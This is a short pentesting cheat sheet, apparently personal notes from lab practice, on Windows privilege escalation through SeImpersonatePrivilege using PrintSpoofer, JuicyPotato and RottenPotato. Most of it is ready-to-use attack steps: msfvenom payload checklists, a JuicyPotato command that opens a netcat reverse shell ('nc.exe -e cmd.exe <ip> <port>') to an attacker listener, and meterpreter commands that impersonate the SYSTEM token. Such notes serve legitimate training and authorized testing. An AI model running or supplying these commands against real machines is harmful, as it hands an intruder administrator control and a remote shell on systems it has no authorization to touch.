# 🥔 Impersonation Attacks

Impersonation attacks allow the attacker to impersonate Services that are running as different users and Impersonate them through the SeImpersonatePrivilege permission on Windows.&#x20;

Enumeration:

```
whoami /priv
```

![](<../../../.gitbook/assets/image (65).png>)

If the SeImpersonatePrivilege is set to Enabled that is our queue to start doing some potato attacks. :D

{% embed url="https://c.tenor.com/G24ZSNHLmRUAAAAM/yahia-potato.gif" %}

We got different appreaches depending on the architechture of the machine we are on.

If the machine is x64, our best strategy is to try PrintSpoofer first since it easier and doesn't require extra steps. If PrintSpoofer doesn't work then we are going to try JuicyPotato. If the architechture is x86 we are going to just try JuicyPotato. If we have a meterpreter session we will first run the command getsystem, if that fails then we will try to use the RottenPotato technique to be able to use the incognito module with more options of impersonation.

Print Spoofer&#x20;

{% embed url="https://github.com/dievus/printspoofer" %}

I am not entirely sure whether this is the binary I use but I am sure it will work either way.&#x20;

* [ ] Generate payload using msfvenom
* [ ] Transfer payload and PrintSpoofer to the machine.&#x20;
* [ ] Start Listener&#x20;
* [ ] Execute command below:

```
PrintSpoofer.exe -c /path/to/payload.ex

or 

PrintSpoofer.exe -i -c cmd.exe 
```

<details>

<summary>Example of PrintSpoofer</summary>

[https://app.gitbook.com/s/IXE4S9y1bygoobC2q1Bz/priv-escalation](https://app.gitbook.com/s/IXE4S9y1bygoobC2q1Bz/priv-escalation) (MeatHead PG)

[https://app.gitbook.com/s/jVmUn0w3TYqT1Knlw8lm/privilege-escalation](https://app.gitbook.com/s/jVmUn0w3TYqT1Knlw8lm/privilege-escalation) (Jacko)

</details>

JuicyPotato&#x20;

This will work for either archs but just keep in mind that depending on which arch the machine is you have to use the respective version of JuicyPotato.&#x20;

{% embed url="https://github.com/ohpe/juicy-potato/tree/master/CLSID" %}

* [ ] Take Note of WIndows Version
* [ ] Take Note of CLSID&#x20;
* [ ] Transfer NC.EXE
* [ ] Transfer JuicyPotato.exe
* [ ] Start Listener
* [ ] Execute command below:

```
Juicy.Potato.x86.exe -t * -l 1337 -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" -p C:\Windows\System32\cmd.exe -a "/c C:\path\to\nc.exe -e cmd.exe <ip> <port>"
```

<details>

<summary>Examples of Juicy Potato</summary>

[https://app.gitbook.com/s/ZQl9kALjcfNuYSSZ9equ/privilege-escalation](https://app.gitbook.com/s/ZQl9kALjcfNuYSSZ9equ/privilege-escalation) (AuthBy)

</details>

Change the CLSID to the one you want to impersonate, if that one doesnt work try the next one, this is a guaranteed Administrator.

RottenPotato

Meterpreter Session required.

Steps:

```
execute -cH -f rottenpotato.ex
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"

```
